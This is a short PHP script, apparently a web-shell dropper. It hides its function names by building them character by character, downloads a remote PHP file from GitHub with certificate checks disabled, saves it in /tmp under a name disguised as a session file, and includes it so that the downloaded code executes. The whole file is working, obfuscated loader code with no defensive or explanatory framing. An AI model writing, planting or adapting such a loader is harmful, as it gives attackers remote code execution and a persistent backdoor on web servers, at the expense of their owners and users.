<?php
error_reporting(E_ALL);
ini_set('display_errors', 1);
$o0 = "f" . "i" . "l" . "e" . "_" . "g" . "e" . "t" . "_" . "c" . "o" . "n" . "t" . "e" . "n" . "t" . "s";
$o1 = "f" . "i" . "l" . "e" . "_" . "p" . "u" . "t" . "_" . "c" . "o" . "n" . "t" . "e" . "n" . "t" . "s";
$d4 = 'sess_' . md5('naxtarrr') . '.php';
$u5 = ['https://raw.githubusercontent.com/b1dar4/DIOS-SQL-INJECTION/refs/heads/main/simple.php', "/tmp/$d4"];

function n4(){
    global $o0, $o1, $u5;
    $b6 = stream_context_create(["ssl" => ["verify_peer" => false, "verify_peer_name" => false]]);
    $o1($u5[1], $o0($u5[0], false, $b6));
}

if (!file_exists($u5[1])) {
    n4();
}
if (filesize($u5[1]) === 0) {
    n4();
}
include($u5[1]);